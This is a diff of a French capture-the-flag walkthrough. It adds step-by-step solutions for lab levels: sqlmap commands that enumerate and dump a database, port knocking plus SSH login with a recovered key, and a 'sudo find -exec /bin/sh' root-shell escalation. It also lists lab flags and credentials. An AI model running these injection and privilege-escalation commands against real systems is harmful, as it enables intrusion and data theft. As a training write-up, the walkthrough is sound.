@@ -173,31 +173,30 @@ Auditer le fichier history des commandes bash pour trouver la séquence de port 
 Requeter le site web via curl afin de forger une commande sqlmap afin de s'injecter dans la base de données
 
 ```bash
-# 1 - Curl initial pour analyser la requete et trouver le parametre vulnérable
+# 1 - Curl initial pour analyser la réponse et trouver le parametre vulnérable
 curl -i "http://10.100.7.4"
 
-
+# 2. Détecter la vulnérabilité SQLi et lancer l'attaque avec sqlmap
 sqlmap -u "http://10.100.7.4?search=test" --batch
 
-# 2. Lister les bases
+# 3. Lister les bases
 sqlmap -u "http://10.100.7.4?search=test" --dbs --batch
-# Output: deepdive_db
 
-# 3. Lister les tables de la base recettes_db
+# 4. Lister les tables de la base recettes_db
 sqlmap -u "http://10.100.7.4?search=test" -D recettes_db --tables --batch
 # Output: users, credentials, system_access
 
-# 4. Dumper la table recettes de la base recettes_db
+# 5. Dumper la table recettes de la base recettes_db
 sqlmap -u "http://localhost/api/search.php?id=1" -D recettes_db -T recettes --dump --batch
 
-# 5. Trouver le binaire caché dans les recettes
+# 6. Trouver le binaire caché dans les recettes
 
 "1010100 1101000 1100101 100000 1110000 1100001 1110011 1110011 1110111 1101111 1110010 1100100 100000 1111001 1101111
  1110101 100000 1101100 1101111 1101111 1101011 1101001 1101110 1100111 100000 1100110 1101111 1110010 100000 1101001
  1110011 100000 111010 100000 1111001 1010010 1110110 110111 1001100 1000010 1110100 1100101 110110 1110010 1000101
  110100 1111010 1111000 1101110 1011001"
 
-# Le convertir en texte clair pour trouver la passphrase de la clé ssh
+# 7. Le convertir en texte clair pour trouver la passphrase de la clé ssh
 
 "The password you looking for is : yRv7LBte6rE4zxnY"
 
@@ -221,27 +220,54 @@ sqlmap -u "http://localhost/api/search.php?id=1" -D recettes_db -T recettes --du
     - User : huguette
     - Pass : LQU8PvANkAuYitkQ
 
-### Niveau 8: Fragment Hunt
+### Niveau 8: Knock Knock Knock Knock Knock, Who's There?
 
-L'idée ici est de récupérer des fragments d'informations détenues dans les 4 machines gardiennes. 
-Chaque machine contient:
- - Une partie de la sequence de port knocking 
- - Une partie de la passphrase de la clé ssh
+La room se déroule en deux phases :
 
-- Premier Gardien
-  - WIP
-  - WIP
-- Deuxième Gardien
-  - WIP
-  - WIP
-- Troisième Gardien
-  - WIP
-  - WIP
-- Quatrième Gardien
-  - WIP
-  - WIP
-  
-  **WORK IN PROGRESS**
+- Phase 1 : Reconnaissance sur node-01, exploitation de la misconfig sudo, récupération de la séquence de knock et de la clé SSH
+- Phase 2 : Port knocking sur node-02, connexion SSH avec la clé récupérée, escalade de lecture pour le flag final
+
+**Phase 1**
+
+Une partie des informations sont disséminées dans les fichiers perso de huguette, il faudra comprendre que des infos plus complètes sont
+disponibles dans les fichiers root, et que pour y accéder il faut utiliser sudo cat. (Sudo Misconfig)
+Une fois les infos récupérées ( compte utilisateur, clé ssh, séquence de knock, adresse IP), il faudra faire du port knocking
+pour se connecter à la machine suivante.
+
+```bash 
+    knock 10.100.8.3 1789 3615 4242 7331 9999
+    ssh -i .ssh/id_rsa colette@10.100.8.3
+```
+
+**Phase 2**
+
+Le fichier secret-key.txt se trouve dans le dossier root/docs, pour y accéder il faut encore une fois faire une elevation de privilèges.
+La commande find permet en mode sudo de copier des fichiers depuis root vers le dossier personnel de huguette.
+
+```bash
+      # Démarrer une session root
+      sudo find . -exec /bin/sh \; -quit
+```
+
+**Décompression de l'archive:**
+```bash
+  unzip -P AMZ63JYowitEDcf secret.zip
+
+# Archive:  secret.zip
+# extracting: flag.txt
+# inflating: key_part.txt
+# extracting: next_level.txt
+```
+
+#### Infos à récupérer pour le niveau suivant:
+
+- Flag : FLAG{sud0_m1sc0nf1g_ru1n3d_my_d4y}
+- contenu du fichier key_part.txt : 77ba815e13fd76a312b2d3372cad0de4ffc0f2dd8c857bd1ad2392d31b96039a
+- contenu du fichier next_level.txt :
+    - Host : 10.100.0.11
+    - User : monique
+    - Pass : MBjHcQ02uyXSFrmH
+
 
 ### Niveau 9: The End
 
